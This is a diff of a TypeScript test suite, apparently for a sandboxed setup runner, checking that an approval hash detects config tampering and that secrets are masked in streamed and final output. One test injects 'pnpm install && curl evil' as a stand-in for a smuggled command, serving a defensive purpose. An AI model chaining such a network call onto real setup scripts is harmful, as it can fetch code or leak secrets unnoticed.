@@ -66,6 +66,7 @@ describe('approvalHash', () => {
     expect(approvalHash(parseEnvironment(FULL.replace('pnpm install', 'pnpm install && curl evil')))).not.toBe(base)
     expect(approvalHash(parseEnvironment(FULL.replace('"NPM_TOKEN"', '"NPM_TOKEN", "AWS_KEY"')))).not.toBe(base)
     expect(approvalHash(parseEnvironment(FULL.replace('host = "api.github.com"', 'host = "uploads.github.com"')))).not.toBe(base)
+    expect(approvalHash(parseEnvironment(`template = "other-image"\n${FULL}`))).not.toBe(base)
   })
 
   it('lists every secret the environment uses', () => {
@@ -94,6 +95,20 @@ describe('runSetup', () => {
     const { execution, calls } = fakeExecution(0)
     await runSetup(execution, { cwd: '/workspace', script: 'pnpm install', secrets: { NPM_TOKEN: 'npm_abc' }, proxyUrl: 'http://box:setup@10.0.0.2:3128' })
     expect(calls[0]).toMatchObject({ command: 'pnpm install', cwd: '/workspace', env: { NPM_TOKEN: 'npm_abc', HTTPS_PROXY: 'http://box:setup@10.0.0.2:3128' } })
+  })
+
+  it('hides secrets in the result and in streamed output, even when a secret is split across chunks', async () => {
+    const chunks: string[] = []
+    const execution = {
+      runShell: async (request: ShellRequest) => {
+        request.onOutput?.(Buffer.from('token npm_ab'), 'stdout')
+        request.onOutput?.(Buffer.from('cdef done\n'), 'stdout')
+        return { exitCode: 0, stdout: 'token npm_abcdef done\n', stderr: '' }
+      },
+    }
+    const result = await runSetup(execution, { cwd: '/w', script: 'x', secrets: { NPM_TOKEN: 'npm_abcdef' }, onOutput: chunk => chunks.push(chunk.toString()) })
+    expect(result.stdout).toBe('token [secret] done\n')
+    expect(chunks.join('')).toBe('token [secret] done\n')
   })
 
   it('fails with the output tail, secrets hidden', async () => {
